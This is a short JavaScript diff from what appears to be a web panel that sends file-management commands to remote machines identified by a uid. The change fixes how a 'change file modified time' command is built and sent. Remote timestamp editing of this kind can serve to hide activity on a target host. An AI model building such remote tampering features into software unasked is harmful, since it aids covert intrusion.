@@ -403,10 +403,12 @@ class index{
                 });
                 new_file.querySelector('.time-btn')?.addEventListener('click', (e) => {
                     e.stopPropagation();
+                    const filenameSpan = new_file.querySelector('.filename');
+                    const currentName = filenameSpan.innerText; // **最新的文件名**
                     const newTime = prompt("Enter the new modified time (format: YYYY-MM-DD HH:mm:ss):");
                     if (newTime) {
-                        const cmd = "CHANG_FILE_TIME^" + full_path + "^" + newTime;
-                        fetch(this.server + "/`+web_route+`?op=msg&uid=" + this.uid + "&msg=" + encodeURIComponent(cmd))+"&Taskid="+TaskId;
+                        const cmd = "CHANG_FILE_TIME^" + currentName + "^" + newTime;
+                        fetch(this.server + "/user_index?op=msg&uid=" + this.uid + "&msg=" + encodeURIComponent(cmd));
                         new_file.querySelector('.filetime').innerText = "<" + newTime + ">";
                     }
                 });
